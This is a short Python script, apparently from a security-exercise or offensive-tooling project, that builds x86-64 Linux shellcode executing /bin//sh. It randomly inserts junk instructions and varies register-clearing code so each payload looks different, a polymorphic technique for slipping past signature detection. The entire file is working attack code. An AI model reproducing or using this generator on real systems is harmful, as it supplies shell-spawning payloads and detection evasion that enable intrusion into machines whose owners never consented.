#!/usr/bin/env python3
import random
from func_instu import *

def partie6():
    part6 = [
        '\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05'
    ]


    xorrsi = randomxor('rsi') # xor rsi, rsi 
    pushrsi = "\\x56" 
    movrdi = "\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68" # mov rdi, 0x68732f2f6e69622f
    pushrdi = "\\x57" 
    pushrsp = "\\x54" 
    poprdi = "\\x5f" 
    moval = "\\xb0\\x3b" # mov 0x3b,al
    cdq = "\\x99"
    syscall = "\\x0f\\x05"

    resultat_concat = xorrsi + pushrsi + movrdi + pushrdi + pushrsp + poprdi + moval + cdq + syscall
    y = random.randint(0, 5)

    match y : 
        case 1 :
            resultat_concat = xorrsi + pushrsi + movrdi + pushrdi + pushrsp + poprdi + moval + cdq + syscall
        case 2 : 
            resultat_concat = xorrsi + pushrsi + full_random() + movrdi + pushrdi + pushrsp + poprdi + moval + cdq + syscall
        case 3 :
            resultat_concat = xorrsi + pushrsi + full_random() + movrdi + pushrdi + full_random() + pushrsp + poprdi + moval + cdq + syscall
        case 4 :
            resultat_concat = xorrsi + pushrsi + full_random() + movrdi + pushrdi + full_random() + pushrsp + poprdi + moval + full_random() +cdq + syscall
        case 5 :
            resultat_concat = xorrsi + full_random() + pushrsi + full_random() + movrdi + full_random() + pushrdi + full_random() + pushrsp + poprdi + moval + cdq + syscall

    return resultat_concat